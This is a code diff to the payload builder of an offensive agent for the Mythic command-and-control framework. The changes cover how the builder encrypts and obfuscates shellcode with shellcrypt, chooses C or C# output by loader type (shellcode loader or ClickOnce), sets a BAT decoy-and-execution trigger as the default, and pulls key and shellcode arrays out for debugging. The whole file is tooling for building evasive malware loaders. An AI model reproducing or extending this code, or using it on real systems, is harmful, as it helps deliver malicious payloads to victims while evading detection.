@@ -65,18 +65,22 @@ ENCODING_METHODS = {
     "NONE"    : ""
 }
 
+#
+# Commented out to reduce confusion
+# uncomment the ones that you will use on your custom loader
+#
 SHELLCODE_FORMAT = {
     "C"          : "c",
     "CSharp"     : "csharp",
-    "Nim"        : "nim",
-    "Go"         : "go",
-    "Python"     : "py",
-    "Powershell" : "ps1",
-    "VBA"        : "vba",
-    "VBScript"   : "vbs",
-    "Rust"       : "rust",
-    "JavaScript" : "js",
-    "Zig"        : "zig",
+    # "Nim"        : "nim",
+    # "Go"         : "go",
+    # "Python"     : "py",
+    # "Powershell" : "ps1",
+    # "VBA"        : "vba",
+    # "VBScript"   : "vbs",
+    # "Rust"       : "rust",
+    # "JavaScript" : "js",
+    # "Zig"        : "zig",
     "Raw"        : "raw",
 }
 
@@ -264,9 +268,9 @@ If one is not uploaded then an example file will be used.""",
         BuildParameter(
             name="0.11 Trigger Type",
             parameter_type=BuildParameterType.ChooseOne,
-            description="Type of Trigger to toggle decoy and execution",
+            description=f"Type of Trigger to toggle decoy and execution. LNK Unavailabe in {semver}",
             choices=["LNK", "BAT", "MSI", "ClickOnce"],
-            default_value="LNK",
+            default_value="BAT",
             required=False,
         ),
 
@@ -932,8 +936,16 @@ generated if none have been entered.""",
                 shellcrypt_path,
                 "-i", mythic_shellcode_path,
                 "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
-                "-f", SHELLCODE_FORMAT[self.get_parameter("2.4 Shellcode Format")],
+                # "-f", SHELLCODE_FORMAT[self.get_parameter("2.4 Shellcode Format")],
             ]
+
+            match self.get_parameter("0.1 Loader Type"):
+                case "ClickOnce":
+                    cmd += ["-f", "csharp"]
+                case "Shellcode Loader":
+                    cmd += ["-f", "c"]
+                case _:
+                    pass
 
             if self.get_parameter("2.4 Shellcode Format") != "Raw":
                 cmd += ["-a", "shellcode"]
@@ -963,10 +975,10 @@ generated if none have been entered.""",
 
             if os.path.exists(obfuscated_shellcode_path):
                 # Copy the obfuscated shellcode file over to the shellcode.hpp file
-                if self.get_parameter("2.4 Shellcode Format") == "C":
+                if self.get_parameter("0.1 Loader Type") == "Shellcode Loader":
                     shutil.copy(src=str(obfuscated_shellcode_path),
                                 dst=str(encryption_shellcode_path))
-                elif self.get_parameter("2.4 Shellcode Format") == "CSharp":
+                elif self.get_parameter("0.1 Loader Type") == "ClickOnce":
                     # For CSharp format, copy to encryption_shellcode_path which will be read later
                     shutil.copy(src=str(obfuscated_shellcode_path),
                                 dst=str(encryption_shellcode_path))
@@ -1022,6 +1034,7 @@ generated if none have been entered.""",
                         StepStdout="Obfuscating Shellcode - Continuing to DLL Loader",
                         StepSuccess=True,
                     ))
+
             elif proc.returncode != 0:
                 response.payload = b""
                 await SendMythicRPCPayloadUpdatebuildStep(
@@ -1034,6 +1047,7 @@ generated if none have been entered.""",
                 response.build_message = "Failed to obfuscate shellcode."
                 response.build_stderr = output + "\n" + obfuscated_shellcode_path
                 return response
+
             else:
                 response.payload = b""
                 response.status = BuildStatus.Error
@@ -1330,7 +1344,7 @@ generated if none have been entered.""",
                                     output += f"[DEBUG] File size: {len(combined_content)} bytes\n"
                                     output += f"[DEBUG] First 500 chars: {combined_content[:500]}\n"
                                     import re
-                                    
+
                                     # Extract key array bytes - handles both C++ and C# formats
                                     # Matches: key[2] = { ... } or byte[] key[2] = { ... }
                                     key_match = re.search(r'(?:byte\[\]\s+)?key\[\d+\]\s*=\s*\{([^}]*)\}', combined_content)
@@ -1344,7 +1358,7 @@ generated if none have been entered.""",
                                             output += f"[DEBUG] No hex values found in key section: {key_section[:100]}\n"
                                     else:
                                         output += "[DEBUG] Key array not found in file\n"
-                                    
+
                                     # Extract shellcode array bytes - handles both C++ and C# formats
                                     # Matches: shellcode[113] = { ... } or sh3llc0d3[113] = { ... } or byte[] shellcode[113] = { ... }
                                     shellcode_match = re.search(r'(?:byte\[\]\s+)?(?:sh3llc0d3|shellcode)\[\d+\]\s*=\s*\{([^}]*)\}', combined_content)
@@ -1358,7 +1372,7 @@ generated if none have been entered.""",
                                             output += f"[DEBUG] No hex values found in shellcode section: {shellcode_section[:100]}\n"
                                     else:
                                         output += "[DEBUG] Shellcode array not found in file\n"
-                                    
+
                             except Exception as extract_error:
                                 output += f"Warning: Could not extract encryption key or shellcode: {str(extract_error)}\n"
                         else:
@@ -1401,7 +1415,7 @@ generated if none have been entered.""",
                     # Makefile target "publish" automatically handles build, cleanup, and verification
                     build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
                     rid = self.get_parameter('0.4 ClickOnce RID') or "win-x64"
-                    
+
                     cmd = [
                         "make",
                         "-C",
@@ -1422,7 +1436,7 @@ generated if none have been entered.""",
                         output += f"[stdout]\n{stdout.decode(errors='replace')}"
                     if stderr:
                         output += f"[stderr]\n{stderr.decode(errors='replace')}"
-                    
+
                     if process.returncode != 0:
                         response.status = BuildStatus.Error
                         response.build_message = f"Makefile publish target failed with exit code {process.returncode}"
